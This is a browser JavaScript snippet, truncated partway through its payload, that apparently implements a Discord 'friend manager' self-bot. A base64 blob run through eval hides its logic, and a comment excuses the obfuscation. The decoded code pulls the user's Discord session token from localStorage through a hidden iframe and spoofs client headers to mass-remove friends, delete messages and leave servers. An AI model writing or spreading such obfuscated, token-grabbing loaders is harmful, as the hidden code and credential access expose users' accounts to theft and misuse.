/////////////////////////////////////////////////////
// SIM! O código está ofuscado, mas tem um motivo! //
// Não é para esconder nada, e sim dificultar      //
// a associação a certas empresas.                 //
/////////////////////////////////////////////////////

(function(base64Input){
    const decodedText = new TextDecoder("utf-8").decode(
        Uint8Array.from(atob(base64Input), char => char.charCodeAt(0))
    );
    eval(decodedText);
})("KGFzeW5jICgpID0+IHsKICAgIGlmICghd2luZG93LmxvY2F0aW9uLmhvc3RuYW1lLmluY2x1ZGVzKCdkaXNjb3JkLmNvbScpKSB7CiAgICAgICAgcmV0dXJuOwogICAgfQoKICAgIGlmIChkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZGlzY29yZC1mcmllbmQtbWFuYWdlcicpKSB7CiAgICAgICAgcmV0dXJuOwogICAgfQoKICAgIGNvbnN0IGdldFRva2VuID0gKCkgPT4gewogICAgICAgIGNvbnN0IGlmcmFtZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2lmcmFtZScpOwogICAgICAgIGlmcmFtZS5zdHlsZS5kaXNwbGF5ID0gJ25vbmUnOwogICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoaWZyYW1lKTsKICAgICAgICBjb25zdCB0b2tlbiA9IGlmcmFtZS5jb250ZW50V2luZG93LmxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpPy5yZXBsYWNlKC8iL2csICcnKTsKICAgICAgICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKGlmcmFtZSk7CiAgICAgICAgcmV0dXJuIHRva2VuOwogICAgfTsKCiAgICBjb25zdCB0b2tlbiA9IGdldFRva2VuKCk7CiAgICBpZiAoIXRva2VuKSB7CiAgICAgICAgc2hvd05vdGlmaWNhdGlvbignVG9rZW4gbsOjbyBlbmNvbnRyYWRvIScsICdlcnJvcicpOwogICAgICAgIHJldHVybjsKICAgIH0KCiAgICBsZXQgcmVxdWVzdERlbGF5ID0gMTAwMDsKICAgIGNvbnN0IHhTdXBlclByb3BlcnRpZXMgPSAnZXlKdmN5STZJbGRwYm1SdmQzTWlMQ0ppY205M2MyVnlJam9pUTJoeWIyMWxJaXdpWkdWMmFXTmxJam9pSWl3aWMzbHpkR1Z0WDJ4dlkyRnNaU0k2SW5CMExVSlNJaXdpYUdGelgyTnNhV1Z1ZEY5dGIyUnpJanBtWVd4elpTd2lZbkp2ZDNObGNsOTFjMlZ5WDJGblpXNTBJam9pVFc5NmFXeHNZUzgxTGpBZ0tGZHBibVJ2ZDNNZ1RsUWdNVEF1TURzZ1YybHVOalE3SUhnMk5Da2dRWEJ3YkdWWFpXSkxhWFF2TlRNM0xqTTJJQ2hMU0ZSTlRDd2diR2xyWlNCSFpXTnJieWtnUTJoeWIyMWxMekV5TUM0d0xqQXVNQ0JUWVdaaGNta3ZOVE0zTGpNMklpd2lZbkp2ZDNObGNsOTJaWEp6YVc5dUlqb2lNVEl3TGpBdU1DNHdJaXdpYjNOZmRtVnljMmx2YmlJNklqRXdJaXdpY21WbVpYSnlaWElpT2lJaUxDSnlaV1psY25KcGJtZGZaRzl0WVdsdUlqb2lJaXdpY21Wc1pXRnpaVjlqYUdGdWJtVnNJam9pYzNSaFlteGxJaXdpWTJ4cFpXNTBYMkoxYVd4a1gyNTFiV0psY2lJNk9UazVPVGs1TENKamJHbGxiblJmWlhabGJuUmZjMjkxY21ObElqcHVkV3hzZlE9PSc7CgogICAgY29uc3Qgbm90aWZpY2F0aW9uUXVldWUgPSBbXTsKICAgIGxldCBhY3RpdmVOb3RpZmljYXRpb25zID0gMDsKICAgIGNvbnN0IE1BWF9OT1RJRklDQVRJT05TID0gMzsKCiAgICBjb25zdCBzdHlsZSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3N0eWxlJyk7CiAgICBzdHlsZS50ZXh0Q29udGVudCA9IGAKICAgIEBrZXlmcmFtZXMgc2xpZGVJblJpZ2h0IHsKICAgIGZyb20geyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoNDAwcHgpOyBvcGFjaXR5OiAwOyB9CiAgICB0byB7IHRyYW5zZm9ybTogdHJhbnNsYXRlWCgwKTsgb3BhY2l0eTogMTsgfQp9CgpAa2V5ZnJhbWVzIHNsaWRlT3V0UmlnaHQgewogICAgZnJvbSB7IHRyYW5zZm9ybTogdHJhbnNsYXRlWCgwKTsgb3BhY2l0eTogMTsgfQogICAgdG8geyB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoNDAwcHgpOyBvcGFjaXR5OiAwOyB9Cn0KCkBrZXlmcmFtZXMgZmFkZUluIHsKICAgIGZyb20geyBvcGFjaXR5OiAwOyB0cmFuc2Zvcm06IHNjYWxlKDAuOTUpOyB9CiAgICB0byB7IG9wYWNpdHk6IDE7IHRyYW5zZm9ybTogc2NhbGUoMSk7IH0KfQoKQGtleWZyYW1lcyBmYWRlT3V0IHsKICAgIGZyb20geyBvcGFjaXR5OiAxOyB0cmFuc2Zvcm06IHNjYWxlKDEpOyB9CiAgICB0byB7IG9wYWNpdHk6IDA7IHRyYW5zZm9ybTogc2NhbGUoMC45NSk7IH0KfQoKQGtleWZyYW1lcyBzaGltbWVyIHsKICAgIDAlIHsgYmFja2dyb3VuZC1wb3NpdGlvbjogLTEwMDBweCAwOyB9CiAgICAxMDAlIHsgYmFja2dyb3VuZC1wb3NpdGlvbjogMTAwMHB4IDA7IH0KfQoKQGtleWZyYW1lcyBkb3RzIHsKICAgIDAlLCAyMCUgeyBjb250ZW50OiAnLic7IH0KICAgIDQwJSB7IGNvbnRlbnQ6ICcuLic7IH0KICAgIDYwJSwgMTAwJSB7IGNvbnRlbnQ6ICcuLi4nOyB9Cn0KCkBrZXlmcmFtZXMgc3BvdGxpZ2h0SW4gewogICAgZnJvbSB7IGNsaXAtcGF0aDogY2lyY2xlKDAlIGF0IGNlbnRlcik7IG9wYWNpdHk6IDA7IH0KICAgIHRvIHsgY2xpcC1wYXRoOiBjaXJjbGUoMTAwJSBhdCBjZW50ZXIpOyBvcGFjaXR5OiAxOyB9Cn0KCkBrZXlmcmFtZXMgc3BvdGxpZ2h0T3V0IHsKICAgIGZyb20geyBjbGlwLXBhdGg6IGNpcmNsZSgxMDAlIGF0IGNlbnRlcik7IG9wYWNpdHk6IDE7IH0KICAgIHRvIHsgY2xpcC1wYXRoOiBjaXJjbGUoMCUgYXQgY2VudGVyKTsgb3BhY2l0eTogMDsgfQp9CgpAa2V5ZnJhbWVzIHB1bHNlSGlnaGxpZ2h0IHsKICAgIDAlLCAxMDAlIHsgdHJhbnNmb3JtOiBzY2FsZSgxKTsgYm94LXNoYWRvdzogMCAwIDAgMCByZ2JhKDg4LCAxMDEsIDI0MiwgMCk7IH0KICAgIDUwJSB7IHRyYW5zZm9ybTogc2NhbGUoMS4wNSk7IGJveC1zaGFkb3c6IDAgMCAyMHB4IDEwcHggcmdiYSg4OCwgMTAxLCAyNDIsIDAuNCk7IH0KfQoKI2Rpc2NvcmQtZnJpZW5kLW1hbmFnZXIgKiB7CiAgICBib3gtc2l6aW5nOiBib3JkZXItYm94Owp9CgojZGlzY29yZC1mcmllbmQtbWFuYWdlciB7CiAgICBwb3NpdGlvbjogZml4ZWQ7CiAgICB0b3A6IDUwJTsKICAgIGxlZnQ6IDUwJTsKICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKC01MCUsIC01MCUpOwogICAgd2lkdGg6IDg1JTsKICAgIG1heC13aWR0aDogNzAwcHg7CiAgICBtYXgtaGVpZ2h0OiA4MHZoOwogICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDE0NWRlZywgIzBmMGYwZiAwJSwgIzFhMWExYSAxMDAlKTsKICAgIGJvcmRlci1yYWRpdXM6IDE2cHg7CiAgICB6LWluZGV4OiA5OTk5OTk7CiAgICBhbmltYXRpb246IGZhZGVJbiAwLjNzIGN1YmljLWJlemllcigwLjE2LCAxLCAwLjMsIDEpOwogICAgZGlzcGxheTogZmxleDsKICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47CiAgICBvdmVyZmxvdzogaGlkZGVuOwogICAgYm94LXNoYWRvdzogMCAyMHB4IDQwcHggcmdiYSgwLCAwLCAwLCAwLjUpOwp9CgojZGlzY29yZC1mcmllbmQtbWFuYWdlci5jbG9zaW5nIHsKICAgIGFuaW1hdGlvbjogZmFkZU91dCAwLjNzIGN1YmljLWJlemllcigwLjE2LCAxLCAwLjMsIDEpIGZvcndhcmRzOwp9CgouZGZtLWhlYWRlciB7CiAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCAjMWExYTFhIDAlLCAjMGYwZjBmIDEwMCUpOwogICAgcGFkZGluZzogMThweCAyMnB4OwogICAgYm9yZGVyLWJvdHRvbTogMXB4IHNvbGlkIHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4wNSk7CiAgICBkaXNwbGF5OiBmbGV4OwogICAganVzdGlmeS1jb250ZW50OiBzcGFjZS1iZXR3ZWVuOwogICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgIGN1cnNvcjogbW92ZTsKICAgIHVzZXItc2VsZWN0OiBub25lOwogICAgcG9zaXRpb246IHJlbGF0aXZlOwogICAgb3ZlcmZsb3c6IGhpZGRlbjsKfQoKLmRmbS1oZWFkZXI6OmJlZm9yZSB7CiAgICBjb250ZW50OiAnJzsKICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgIHRvcDogMDsKICAgIGxlZnQ6IC0xMDAlOwogICAgd2lkdGg6IDEwMCU7CiAgICBoZWlnaHQ6IDEwMCU7CiAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoOTBkZWcsIHRyYW5zcGFyZW50LCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMDMpLCB0cmFuc3BhcmVudCk7CiAgICBhbmltYXRpb246IHNoaW1tZXIgM3MgaW5maW5pdGU7Cn0KCi5kZm0tdGl0bGUgewogICAgY29sb3I6ICNmZmZmZmY7CiAgICBmb250LXNpemU6IDE2cHg7CiAgICBmb250LXdlaWdodDogNzAwOwogICAgbGV0dGVyLXNwYWNpbmc6IC0wLjVweDsKICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsKICAgIGxlZnQ6IDUwJTsKICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWCgtNTAlKTsKICAgIHotaW5kZXg6IDE7Cn0KCi5kZm0tY29udHJvbHMgewogICAgZGlzcGxheTogZmxleDsKICAgIGdhcDogNnB4OwogICAgcG9zaXRpb246IHJlbGF0aXZlOwogICAgei1pbmRleDogMTsKICAgIG1hcmdpbi1sZWZ0OiBhdXRvOwp9CgouZGZtLWJ0bi1pY29uIHsKICAgIGJhY2tncm91bmQ6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4wNSk7CiAgICBib3JkZXI6IDFweCBzb2xpZCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMDgpOwogICAgY29sb3I6ICNiMGIwYjA7CiAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICBwYWRkaW5nOiA4cHggMTJweDsKICAgIGJvcmRlci1yYWRpdXM6IDhweDsKICAgIHRyYW5zaXRpb246IGFsbCAwLjNzIGN1YmljLWJlemllcigwLjE2LCAxLCAwLjMsIDEpOwogICAgZm9udC1zaXplOiAxNnB4OwogICAgZm9udC13ZWlnaHQ6IDYwMDsKICAgIGxpbmUtaGVpZ2h0OiAxOwogICAgd2lkdGg6IDM2cHg7CiAgICBoZWlnaHQ6IDM2cHg7CiAgICBkaXNwbGF5OiBmbGV4OwogICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgIGp1c3RpZnktY29udGVudDogY2VudGVyOwp9CgouZGZtLWJ0bi1pY29uOmhvdmVyIHsKICAgIGJhY2tncm91bmQ6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4xKTsKICAgIGNvbG9yOiAjZmZmOwogICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC0ycHgpIHNjYWxlKDEuMDUpOwogICAgYm9yZGVyLWNvbG9yOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMTUpOwp9CgouZGZtLWJ0bi1pY29uOmFjdGl2ZSB7CiAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVkoMCkgc2NhbGUoMC45OCk7Cn0KCi5kZm0tY29udGVudCB7CiAgICBwYWRkaW5nOiAwOwogICAgb3ZlcmZsb3cteTogYXV0bzsKICAgIG92ZXJmbG93LXg6IGhpZGRlbjsKICAgIGZsZXg6IDE7CiAgICBiYWNrZ3JvdW5kOiAjMGYwZjBmOwogICAgc2Nyb2xsYmFyLXdpZHRoOiBub25lOwogICAgLW1zLW92ZXJmbG93LXN0eWxlOiBub25lOwp9CgouZGZtLWNvbnRlbnQ6Oi13ZWJraXQtc2Nyb2xsYmFyIHsKICAgIGRpc3BsYXk6IG5vbmU7Cn0KCi5kZm0tdGFicyB7CiAgICBkaXNwbGF5OiBmbGV4OwogICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDEzNWRlZywgIzE1MTUxNSAwJSwgIzBhMGEwYSAxMDAlKTsKICAgIGJvcmRlci1ib3R0b206IDFweCBzb2xpZCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMDUpOwp9CgouZGZtLXRhYiB7CiAgICBmbGV4OiAxOwogICAgcGFkZGluZzogMTRweCAyMHB4OwogICAgYmFja2dyb3VuZDogdHJhbnNwYXJlbnQ7CiAgICBib3JkZXI6IG5vbmU7CiAgICBjb2xvcjogIzg4ODsKICAgIGZvbnQtc2l6ZTogMTNweDsKICAgIGZvbnQtd2VpZ2h0OiA2MDA7CiAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICB0cmFuc2l0aW9uOiBhbGwgMC4zcyBjdWJpYy1iZXppZXIoMC4xNiwgMSwgMC4zLCAxKTsKICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsKfQoKLmRmbS10YWI6aG92ZXIgewogICAgY29sb3I6ICNmZmY7CiAgICBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMDMpOwp9CgouZGZtLXRhYi5hY3RpdmUgewogICAgY29sb3I6ICM1ODY1ZjI7CiAgICBiYWNrZ3JvdW5kOiByZ2JhKDg4LCAxMDEsIDI0MiwgMC4wNSk7Cn0KCi5kZm0tdGFiLmFjdGl2ZTo6YWZ0ZXIgewogICAgY29udGVudDogJyc7CiAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICBib3R0b206IC0xcHg7CiAgICBsZWZ0OiAwOwogICAgcmlnaHQ6IDA7CiAgICBoZWlnaHQ6IDJweDsKICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCg5MGRlZywgIzU4NjVmMiwgIzQ3NTJjNCk7Cn0KCi5kZm0tdGFiLWNvbnRlbnQgewogICAgZGlzcGxheTogbm9uZTsKICAgIHBhZGRpbmc6IDIycHg7Cn0KCi5kZm0tdGFiLWNvbnRlbnQuYWN0aXZlIHsKICAgIGRpc3BsYXk6IGJsb2NrOwp9CgouZGZtLXNlYXJjaC1jb250YWluZXIgewogICAgbWFyZ2luLWJvdHRvbTogMjBweDsKfQoKLmRmbS1zZWFyY2ggewogICAgd2lkdGg6IDEwMCU7CiAgICBwYWRkaW5nOiAxMnB4IDE2cHg7CiAgICBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMDUpOwogICAgYm9yZGVyOiAxcHggc29saWQgcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjEpOwogICAgYm9yZGVyLXJhZGl1czogMTBweDsKICAgIGNvbG9yOiAjZmZmOwogICAgZm9udC1zaXplOiAxNHB4OwogICAgdHJhbnNpdGlvbjogYWxsIDAuM3M7Cn0KCi5kZm0tc2VhcmNoOmZvY3VzIHsKICAgIG91dGxpbmU6IG5vbmU7CiAgICBib3JkZXItY29sb3I6ICM1ODY1ZjI7CiAgICBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMDgpOwp9CgouZGZtLWFjdGlvbnMgewogICAgZGlzcGxheTogZ3JpZDsKICAgIGdyaWQtdGVtcGxhdGUtY29sdW1uczogcmVwZWF0KGF1dG8tZml0LCBtaW5tYXgoMTYwcHgsIDFmcikpOwogICAgZ2FwOiAxMHB4OwogICAgbWFyZ2luLWJvdHRvbTogMjJweDsKfQoKLmRmbS1idG4gewogICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDEzNWRlZywgIzU4NjVmMiAwJSwgIzQ3NTJjNCAxMDAlKTsKICAgIGNvbG9yOiAjZmZmOwogICAgYm9yZGVyOiBub25lOwogICAgcGFkZGluZzogMTJweCAyMHB4OwogICAgYm9yZGVyLXJhZGl1czogMTBweDsKICAgIGZvbnQtc2l6ZTogMTNweDsKICAgIGZvbnQtd2VpZ2h0OiA2MDA7CiAgICBjdXJzb3I6IHBvaW50ZXI7CiAgICB0cmFuc2l0aW9uOiBhbGwgMC4zcyBjdWJpYy1iZXppZXIoMC4xNiwgMSwgMC4zLCAxKTsKICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsKICAgIG92ZXJmbG93OiBoaWRkZW47Cn0KCi5kZm0tYnRuOjpiZWZvcmUgewogICAgY29udGVudDogJyc7CiAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICB0b3A6IDA7CiAgICBsZWZ0OiAtMTAwJTsKICAgIHdpZHRoOiAxMDAlOwogICAgaGVpZ2h0OiAxMDAlOwogICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDkwZGVnLCB0cmFuc3BhcmVudCwgcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjIpLCB0cmFuc3BhcmVudCk7CiAgICB0cmFuc2l0aW9uOiBsZWZ0IDAuNXM7Cn0KCi5kZm0tYnRuOmhvdmVyOjpiZWZvcmUgewogICAgbGVmdDogMTAwJTsKfQoKLmRmbS1idG46aG92ZXIgewogICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC0ycHgpOwp9CgouZGZtLWJ0bjphY3RpdmUgewogICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDApOwp9CgouZGZtLWJ0bi5zZWNvbmRhcnkgewogICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDEzNWRlZywgIzJhMmEyYSAwJSwgIzFmMWYxZiAxMDAlKTsKICAgIGJvcmRlcjogMXB4IHNvbGlkIHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4wOCk7Cn0KCi5kZm0tYnRuLnNlY29uZGFyeTpob3ZlciB7CiAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCAjMzIzMjMyIDAlLCAjMjcyNzI3IDEwMCUpOwp9CgouZGZtLWJ0bi5kYW5nZXIgewogICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDEzNWRlZywgI2VkNDI0NSAwJSwgI2MwMzUzNyAxMDAlKTsKfQoKLmRmbS1idG4ud2FybmluZyB7CiAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCAjZmFhNjFhIDAlLCAjZDY4YTE1IDEwMCUpOwp9CgouZGZtLWJ0bjpkaXNhYmxlZCB7CiAgICBvcGFjaXR5OiAwLjU7CiAgICBjdXJzb3I6IG5vdC1hbGxvd2VkOwogICAgdHJhbnNmb3JtOiBub25lOwogICAgcG9pbnRlci1ldmVudHM6IG5vbmU7Cn0KCi5kZm0tZnJpZW5kLCAuZGZtLXNlcnZlciB7CiAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCAjMWExYTFhIDAlLCAjMTUxNTE1IDEwMCUpOwogICAgcGFkZGluZzogMTRweCAxOHB4OwogICAgYm9yZGVyLXJhZGl1czogMTJweDsKICAgIG1hcmdpbi1ib3R0b206IDEwcHg7CiAgICBkaXNwbGF5OiBmbGV4OwogICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgIGdhcDogMTRweDsKICAgIHRyYW5zaXRpb246IGFsbCAwLjNzIGN1YmljLWJlemllcigwLjE2LCAxLCAwLjMsIDEpOwogICAgYm9yZGVyOiAxcHggc29saWQgcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjA1KTsKICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsKICAgIG92ZXJmbG93OiBoaWRkZW47Cn0KCi5kZm0tZnJpZW5kOjpiZWZvcmUsIC5kZm0tc2VydmVyOjpiZWZvcmUgewogICAgY29udGVudDogJyc7CiAgICBwb3NpdGlvbjogYWJzb2x1dGU7CiAgICB0b3A6IDA7CiAgICBsZWZ0OiAtMTAwJTsKICAgIHdpZHRoOiAxMDAlOwogICAgaGVpZ2h0OiAxMDAlOwogICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDkwZGVnLCB0cmFuc3BhcmVudCwgcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjAzKSwgdHJhbnNwYXJlbnQpOwogICAgdHJhbnNpdGlvbjogbGVmdCAwLjVzOwp9CgouZGZtLWZyaWVuZDpob3Zlcjo6YmVmb3JlLCAuZGZtLXNlcnZlcjpob3Zlcjo6YmVmb3JlIHsKICAgIGxlZnQ6IDEwMCU7Cn0KCi5kZm0tZnJpZW5kOmhvdmVyLCAuZGZtLXNlcnZlcjpob3ZlciB7CiAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCAjMjAyMDIwIDAlLCAjMWExYTFhIDEwMCUpOwogICAgYm9yZGVyLWNvbG9yOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMSk7CiAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZVgoNHB4KTsKfQoKLmRmbS1mcmllbmQuc2VsZWN0ZWQsIC5kZm0tc2VydmVyLnNlbGVjdGVkIHsKICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsICMyYTNhNmEgMCUsICMxZjJkNTIgMTAwJSk7CiAgICBib3JkZXItY29sb3I6IHJnYmEoODgsIDEwMSwgMjQyLCAwLjUpOwp9CgouZGZtLWNoZWNrYm94IHsKICAgIHdpZHRoOiAyMHB4OwogICAgaGVpZ2h0OiAyMHB4OwogICAgY3Vyc29yOiBwb2ludGVyOwogICAgYWNjZW50LWNvbG9yOiAjNTg2NWYyOwogICAgZmxleC1zaHJpbms6IDA7CiAgICBib3JkZXItcmFkaXVzOiA1cHg7Cn0KCi5kZm0tYXZhdGFyLCAuZGZtLXNlcnZlci1pY29uIHsKICAgIHdpZHRoOiA0NnB4OwogICAgaGVpZ2h0OiA0NnB4OwogICAgYm9yZGVyLXJhZGl1czogNTAlOwogICAgZmxleC1zaHJpbms6IDA7CiAgICBib3JkZXI6IDJweCBzb2xpZCByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMSk7CiAgICB0cmFuc2l0aW9uOiBhbGwgMC4zczsKfQoKLmRmbS1zZXJ2ZXItaWNvbiB7CiAgICBib3JkZXItcmFkaXVzOiAxMHB4Owp9CgouZGZtLWZyaWVuZDpob3ZlciAuZGZtLWF2YXRhciwgLmRmbS1zZXJ2ZXI6aG92ZXIgLmRmbS1zZXJ2ZXItaWNvbiB7CiAgICBib3JkZXItY29sb3I6IHJnYmEoODgsIDEwMSwgMjQyLCAwLjUpOwogICAgdHJhbnNmb3JtOiBzY2FsZSgxLjA1KTsKfQoKLmRmbS1pbmZvIHsKICAgIGZsZXg6IDE7CiAgICBtaW4td2lkdGg6IDA7Cn0KCi5kZm0tbmFtZSB7CiAgICBjb2xvcjogI2ZmZjsKICAgIGZvbnQtc2l6ZTogMTRweDsKICAgIGZvbnQtd2VpZ2h0OiA2MDA7CiAgICB3aGl0ZS1zcGFjZTogbm93cmFwOwogICAgb3ZlcmZsb3c6IGhpZGRlbjsKICAgIHRleHQtb3ZlcmZsb3c6IGVsbGlwc2lzOwp9CgouZGZtLWZyaWVuZC1hY3Rpb25zLCAuZGZtLXNlcnZlci1hY3Rpb25zIHsKICAgIGRpc3BsYXk6IGZsZXg7CiAgICBnYXA6IDZweDsKICAgIGZsZXgtc2hyaW5rOiAwOwp9CgouZGZtLXJlbW92ZSwgLmRmbS1kZWxldGUtbWVzc2FnZXMsIC5kZm0tbGVhdmUtc2VydmVyIHsKICAgIGJvcmRlcjogbm9uZTsKICAgIHBhZGRpbmc6IDhweCAxNHB4OwogICAgYm9yZGVyLXJhZGl1czogOHB4OwogICAgZm9udC1zaXplOiAxMnB4OwogICAgZm9udC13ZWlnaHQ6IDYwMDsKICAgIGN1cnNvcjogcG9pbnRlcjsKICAgIHRyYW5zaXRpb246IGFsbCAwLjNzIGN1YmljLWJlemllcigwLjE2LCAxLCAwLjMsIDEpOwogICAgY29sb3I6ICNmZmY7Cn0KCi5kZm0tcmVtb3ZlIHsKICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsICNlZDQyNDUgMCUsICNjMDM1MzcgMTAwJSk7Cn0KCi5kZm0tZGVsZXRlLW1lc3NhZ2VzIHsKICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsICNmYWE2MWEgMCUsICNkNjhhMTUgMTAwJSk7Cn0KCi5kZm0tbGVhdmUtc2VydmVyIHsKICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxMzVkZWcsICM1ODY1ZjIgMCUsICM0NzUyYzQgMTAwJSk7Cn0KCi5kZm0tcmVtb3ZlOmhvdmVyLCAuZGZtLWRlbGV0ZS1tZXNzYWdlczpob3ZlciwgLmRmbS1sZWF2ZS1zZXJ2ZXI6aG92ZXIgewogICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC0ycHgpOwp9CgouZGZtLXJlbW92ZTphY3RpdmUsIC5kZm0tZGVsZXRlLW1lc3NhZ2VzOmFjdGl2ZSwgLmRmbS1sZWF2ZS1zZXJ2ZXI6YWN0aXZlIHsKICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlWSgwKTsKfQoKLmRmbS1yZW1vdmU6ZGlzYWJsZWQsIC5kZm0tZGVsZXRlLW1lc3NhZ2VzOmRpc2FibGVkLCAuZGZtLWxlYXZlLXNlcnZlcjpkaXNhYmxlZCB7CiAgICBvcGFjaXR5OiAwLjU7CiAgICBjdXJzb3I6IG5vdC1hbGxvd2VkOwogICAgdHJhbnNmb3JtOiBub25lOwp9CgouZGZtLWxvYWRpbmcgewogICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgY29sb3I6ICM4ODg7CiAgICBwYWRkaW5nOiA2MHB4IDIwcHg7CiAgICBmb250LXNpemU6IDE0cHg7CiAgICBmb250LXdlaWdodDogNTAwOwp9CgouZGZtLWxvYWRpbmc6OmFmdGVyIHsKICAgIGNvbnRlbnQ6ICcuLi4nOwogICAgYW5pbWF0aW9uOiBkb3RzIDEuNXMgc3RlcHMoNCwgZW5kKSBpbmZpbml0ZTsKfQoKLmRmbS1lbXB0eSB7CiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICBjb2xvcjogIzg4ODsKICAgIHBhZGRpbmc6IDYwcHggMjBweDsKICAgIGZvbnQtc2l6ZTogMTRweDsKICAgIGZvbnQtd2VpZ2h0OiA1MDA7Cn0KCi5kZm0tbW9kYWwgewogICAgcG9zaXRpb246IGZpeGVkOwogICAgdG9wOiAwOwogICAgbGVmdDogMDsKICAgIHdpZHRoOiAxMDAlOwogICAgaGVpZ2h0OiAxMDAlOwogICAgYmFja2dyb3VuZDogcmdiYSgwLCAwLCAwLCAwLjg1KTsKICAgIGRpc3BsYXk6IGZsZXg7CiAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICB6LWluZGV4OiAxMDAwMDAwOwogICAgYW5pbWF0aW9uOiBmYWRlSW4gMC4zcyBlYXNlLW91dDsKICAgIHBhZGRpbmc6IDIwcHg7CiAgICBiYWNrZHJvcC1maWx0ZXI6IGJsdXIoOHB4KTsKfQoKLmRmbS1tb2RhbC1jb250ZW50IHsKICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxNDVkZWcsICMxYTFhMWEgMCUsICMwZjBmMGYgMTAwJSk7CiAgICBwYWRkaW5nOiAzMHB4OwogICAgYm9yZGVyLXJhZGl1czogMTZweDsKICAgIG1heC13aWR0aDogNDIwcHg7CiAgICB3aWR0aDogMTAwJTsKICAgIGFuaW1hdGlvbjogZmFkZUluIDAuM3MgY3ViaWMtYmV6aWVyKDAuMTYsIDEsIDAuMywgMSk7Cn0KCi5kZm0tbW9kYWwtdGl0bGUgewogICAgY29sb3I6ICNmZmY7CiAgICBmb250LXNpemU6IDIwcHg7CiAgICBmb250LXdlaWdodDogNzAwOwogICAgbWFyZ2luLWJvdHRvbTogMTRweDsKICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgIGxldHRlci1zcGFjaW5nOiAtMC41cHg7Cn0KCi5kZm0tbW9kYWwtdGV4dCB7CiAgICBjb2xvcjogI2IwYjBiMDsKICAgIGZvbnQtc2l6ZTogMTRweDsKICAgIG1hcmdpbi1ib3R0b206IDI0cHg7CiAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICBsaW5lLWhlaWdodDogMS42Owp9CgouZGZtLW1vZGFsLWFjdGlvbnMgewogICAgZGlzcGxheTogZmxleDsKICAgIGdhcDogMTBweDsKI